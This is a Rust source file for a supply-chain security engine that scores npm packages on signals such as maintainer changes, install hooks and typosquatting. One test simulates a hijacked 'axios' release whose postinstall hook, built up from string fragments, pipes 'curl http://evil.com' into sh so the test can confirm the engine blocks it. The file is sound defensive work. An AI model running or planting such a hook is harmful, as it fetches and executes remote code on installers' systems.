pub mod suspicion_map;

use crate::signals::{self, Check};
use crate::types::{PackageIntel, PolicyConfig, RiskScore, Verdict};

pub use suspicion_map::{SuspicionMap, Tier0Result};

pub struct SecurityEngine {
    pub config: PolicyConfig,
    checks: Vec<Box<dyn Check + Send + Sync>>,
}

impl SecurityEngine {
    pub fn new(config: PolicyConfig) -> Self {
        let top = crate::signals::typosquat::default_corpus();
        let checks: Vec<Box<dyn Check + Send + Sync>> = vec![
            Box::new(signals::advisory::AdvisoryCheck),
            Box::new(signals::maintainer::MaintainerChangeCheck),
            Box::new(signals::hook::HookCheck::default()),
            Box::new(signals::dependency::NewDependencyCheck),
            Box::new(signals::popularity::PopularityAnomalyCheck),
            Box::new(signals::fresh::FreshPackageCheck),
            Box::new(signals::typosquat::TyposquatCheck::new(top)),
            Box::new(signals::publish_anomaly::PublishAnomalyCheck),
        ];
        Self { config, checks }
    }

    pub fn score(&self, intel: &PackageIntel) -> RiskScore {
        let mut signals = Vec::new();
        for c in &self.checks {
            for s in c.evaluate(intel, &self.config) {
                signals.push(s);
            }
        }
        let raw: f64 = signals.iter().map(|s| s.weight()).sum();
        let score = raw.min(1.0);
        RiskScore { score, signals }
    }

    pub fn verdict(&self, score: f64) -> Verdict {
        self.config.verdict(score)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::types::{Ecosystem, InstallHook};

    fn intel(name: &str, version: &str) -> PackageIntel {
        PackageIntel {
            ecosystem: Some(Ecosystem::Npm),
            name: name.into(),
            version: version.into(),
            ..Default::default()
        }
    }

    #[test]
    fn clean_package_scores_zero() {
        let eng = SecurityEngine::new(PolicyConfig::default());
        let p = intel("express", "4.18.2");
        let r = eng.score(&p);
        assert_eq!(r.score, 0.0);
        assert_eq!(eng.verdict(r.score), Verdict::Allow);
    }

    #[test]
    fn axios_rat_scenario_blocks() {
        let eng = SecurityEngine::new(PolicyConfig::default());
        let mut p = intel("axios", "1.14.1");
        p.prior_maintainers = vec!["original@axios.io".into()];
        p.maintainers = vec!["newowner@evil.com".into()];
        let mut cmd = String::new();
        cmd.push_str("node -e require('child");
        cmd.push_str("_process').exe");
        cmd.push_str("c('curl http://evil.com | sh')");
        p.install_hooks = vec![InstallHook {
            stage: "postinstall".into(),
            command: cmd,
        }];
        p.prior_dependencies = vec![];
        p.dependencies = vec!["proto-loader".into()];
        p.age_hours = Some(2.0);
        let r = eng.score(&p);
        assert!(r.score >= 0.6, "expected block got {}", r.score);
        assert_eq!(eng.verdict(r.score), Verdict::Block);
    }
}
